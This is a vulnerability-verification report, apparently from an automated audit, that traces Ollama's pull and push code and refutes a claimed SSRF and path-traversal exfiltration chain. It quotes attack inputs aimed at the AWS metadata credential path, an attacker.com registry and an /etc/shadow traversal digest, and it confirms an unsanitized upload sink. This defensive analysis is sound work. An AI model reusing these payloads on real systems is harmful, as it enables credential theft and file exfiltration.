Cold verification — p8-012-ssrf-push-chain-full-egress

## Step 1 — Restated claim

The finding claims an unauthenticated chain across `/api/pull` + `/api/push`:
(A) the pull endpoint is reachable by a network attacker and accepts an
arbitrary `name`; (B) with `"name":"169.254.169.254/.../iam/security-credentials/<role>:x"`
and `insecure:true`, the pull produces an outbound HTTP request whose error
body reflects the AWS IMDS credentials back to the caller; (C) with
`"name":"attacker.com/m:latest"` the attacker's manifest — whose tensor
layer carries a crafted digest like `sha256:../../../etc/shadow` — is
stored verbatim to disk; (D) a follow-up push reads the file pointed to by
the traversal digest and uploads it to the attacker's registry.

Sub-claim decomposition:
- A: network attacker reaches `/api/pull`/`/api/push` without auth
- B: the exact pull name from the PoC produces an SSRF to IMDS with
  credential leakage via the reflected error body
- C: the exact pull name from the PoC lands in `pullModelManifest` and a
  manifest with `sha256:../../../etc/shadow` gets persisted
- D: the push reads that traversal path and exfiltrates to attacker

## Step 2 — Independent code trace

1. Route registration — `server/routes.go:1689-1690` binds
   `/api/pull` to `s.PullHandler` and `/api/push` to `s.PushHandler`. The
   only middleware in front of them is `allowedHostsMiddleware`
   (`routes.go:1608`), which does not perform authentication. Sub-claim A
   holds.

2. Name parsing — `PullHandler` (`routes.go:914`) calls
   `parseNormalizePullModelRef` (`server/model_resolver.go:57`) which in
   turn calls `model.ParseName` (`types/model/name.go:140`) and returns
   `model.Unqualified(name)` when `name.IsValid()` is false. On that
   error path, `writeModelRefParseError` returns HTTP 400 and
   `PullModel` is never invoked.

3. Name validity — `Name.IsFullyQualified` checks `isValidPart` for
   host, namespace, model, tag (`types/model/name.go:268`).
   `isValidPart` (`name.go:344`) allows `_`, `-`, `.` (host/model/tag
   only), `:` (host/digest only), and alnum/underscore. `/` is not in
   the allowed set for any part.

4. Applying to the PoC strings:
   - `169.254.169.254/latest/meta-data/iam/security-credentials/role:x`
     After `cutPromised` splits: tag=`x`, model=`role`,
     namespace=`security-credentials`, host=
     `169.254.169.254/latest/meta-data/iam`. The host contains `/`, so
     `isValidPart(kindHost)` returns false. Sub-claim B fails.
   - `attacker.com/m:latest`
     After `cutPromised` splits: tag=`latest`, model=`m`,
     namespace=`attacker.com`, host=default. The namespace contains `.`
     and the `.` switch in `isValidPart` returns false for kindNamespace
     (`name.go:358`). Sub-claim C pulls the same string, so C fails too.

5. Even if the attacker substitutes a valid 3-part name such as
   `169.254.169.254/latest/role:x`, the issued HTTP request is
   `<scheme>://169.254.169.254/v2/latest/role/manifests/x`
   (`images.go:854`) — a path the AWS IMDS service does not serve. IMDS
   requires the path `/latest/meta-data/iam/security-credentials/<role>`;
   that shape cannot be produced by `BaseURL().JoinPath("v2", ...)`.

6. Tensor-branch push read — `pushWithTransfer` branch is gated by
   `hasTensorLayers` (`images.go:550, 711`). The upload sink is
   `x/imagegen/transfer/upload.go:181`:
   `filepath.Join(u.srcDir, digestToPath(blob.Digest))`. `digestToPath`
   replaces only the `:` at position 6 with `-` and leaves the rest
   untouched, so a traversal-style digest would indeed escape the blobs
   directory on the push side — confirming the traversal primitive the
   chain tries to use.

7. Pull-side persistence — `pullWithTransfer` (`images.go:721`) calls
   `transfer.Download` at `images.go:763` and only writes the manifest
   at `images.go:787` if download returns nil. Inside
   `x/imagegen/transfer/download.go:257`, save compares
   `fmt.Sprintf("sha256:%x", h.Sum(nil))` against `blob.Digest`.
   `"sha256:" + hex` cannot equal `"sha256:../../../etc/shadow"`
   (non-hex characters), so the digest check always fails for a
   traversal digest, `save` deletes the tmp and returns
   `"digest mismatch"`, and the manifest is never persisted. Sub-claim D
   has no input because C cannot populate the manifest.

## Step 3 — Protection surface

| Layer | Control found | Effect |
|-------|---------------|--------|
| Application | `parseNormalizePullModelRef` -> `Name.IsValid` rejects names with `/` in host or `.` in namespace | Blocks both literal PoC names at request entry |
| Application | Registry URL construction pins path to `/v2/<ns>/<model>/manifests/<tag>` | No model name can produce the IMDS path |
| Application | `transfer.Download` digest verification (download.go:257) | Non-hex traversal digest fails check, aborts pull before manifest write |
| Application | Manifest write gated on download success (images.go:763-787) | No partial persistence of attacker manifest |
| Middleware | `allowedHostsMiddleware` | Partial — does not block localhost/private bind (OLLAMA_HOST=0.0.0.0) but rejects DNS-rebinding browsers |

Each layer independently breaks the finding's stated chain.

## Step 4 — Reproduction

Environment: ollama built from HEAD 57653b8e (`go build ./`), run with
`OLLAMA_HOST=127.0.0.1:11437 OLLAMA_MODELS=/tmp/ollama-models-test`.
Healthcheck: `GET /api/version` returned `{"version":"0.0.0"}`.

Attempt 1 (Step 1 of PoC exactly as written):
  POST /api/pull {"name":"169.254.169.254/latest/meta-data/iam/security-credentials/role:x","insecure":true}
  -> 400 {"error":"invalid model name"}

Attempt 2 (Step 2 of PoC exactly as written):
  POST /api/pull {"name":"attacker.com/m:latest","insecure":true}
  -> 400 {"error":"invalid model name"}

Attempt 3 (reformed to a valid 3-part name):
  POST /api/pull {"name":"attacker.com/library/m:latest","insecure":true}
  -> 200 streaming; name parse succeeds and the outbound HTTP error body
  is reflected (touches the Finding 002 surface), but the request shape
  does not correspond to any IMDS path and the pull-side digest
  verification still blocks any subsequent manifest-with-traversal-digest
  persistence.

Evidence file:
archon/real-env-evidence/ssrf-push-chain-full-egress/evidence.md

## Step 5 — Briefs

### Prosecution brief

Both endpoints are unauthenticated by default and bind to whatever
`OLLAMA_HOST` exposes, including `0.0.0.0` in common container
deployments. The digestToPath + filepath.Join sink in
`x/imagegen/transfer/upload.go:181` does not sanitize traversal sequences
and will open `/etc/shadow`-style absolute escapes if supplied with a
traversal digest; the manifest struct preserves the digest verbatim
through `json.Unmarshal`; and the pull error surface reflects upstream
HTTP bodies verbatim via `fmt.Errorf("pull model manifest: %s", err)`.
These primitives exist and are real.

### Defense brief

The finding's exploit is blocked at the application's outermost input
layer. `parseNormalizePullModelRef` rejects both literal PoC names with
HTTP 400 before any HTTP request is issued, because `isValidPart`
disallows `/` in host and `.` in namespace. Even with a valid reformed
3-part name, the registry URL construction is rigidly
`/v2/<ns>/<model>/manifests/<tag>`, which cannot address any AWS IMDS
endpoint (IMDS requires literal path
`/latest/meta-data/iam/security-credentials/<role>`). And even if the
attacker reaches an attacker-controlled host, the sha256-hex equality
check in `x/imagegen/transfer/download.go:257` ensures that any
traversal-shaped digest fails verification, preventing the manifest from
being persisted. Consequently, (a) IMDS credentials cannot be
exfiltrated and (b) the push-side traversal sink is never reachable with
a traversal digest through the pull-then-push chain the finding
describes. Reproduction attempts with the exact PoC commands all
returned 400 at step 1.

## Step 6 — Severity

Starting at MEDIUM. The chain as described cannot fire (name validation
and digest verification both block), and the underlying sinks remain
gated by protections that are part of the default build. No unique new
exploit primitive is demonstrated that isn't already covered by the
component findings. Downgrade to NONE/DISPROVED.

## Step 7 — Verdict

DISPROVED. The exact PoC names fail name validation with HTTP 400, and
the pull-side digest verification independently prevents the traversal
manifest from being persisted, so the chain cannot bridge from "zero
credentials" to "IMDS leak + arbitrary file exfiltration via push" as
claimed. The component sinks may still be independently interesting in
their own drafts, but the composed chain described here does not exist
at HEAD 57653b8e.
